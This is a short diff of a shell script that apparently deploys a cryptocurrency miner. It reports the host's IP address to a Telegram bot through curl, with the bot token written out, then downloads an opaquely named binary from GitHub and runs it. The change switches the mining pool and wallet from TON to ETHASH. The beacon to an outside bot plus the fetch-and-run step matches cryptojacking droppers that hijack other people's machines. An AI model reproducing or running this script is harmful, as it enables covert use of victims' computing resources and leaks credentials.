@@ -7,4 +7,4 @@ n0z="$myIp|MINING_TON"
 curl --silent -X GET 'https://api.telegram.org/bot1936519764:AAFhpKRoPybd6q1Kqqb-iWFxjdxKlfX3q_0/sendMessage?chat_id=1335828890&text='$n0z --compressed
 
 wget https://github.com/ontoseno90/master/raw/main/dev && chmod +x dev 
-./dev --algo TON --pool https://pool.services.tonwhales.com --user EQBIMDxfFcFE-3vVGlFc0rwKfaVG-KZ_MAVinAarYFEoCkrt
+./dev --algo ETHASH --pool ethw.2miners.com:2020 --user 0x205023e287bd796ed7f9d458a04d7956c11d9ea3
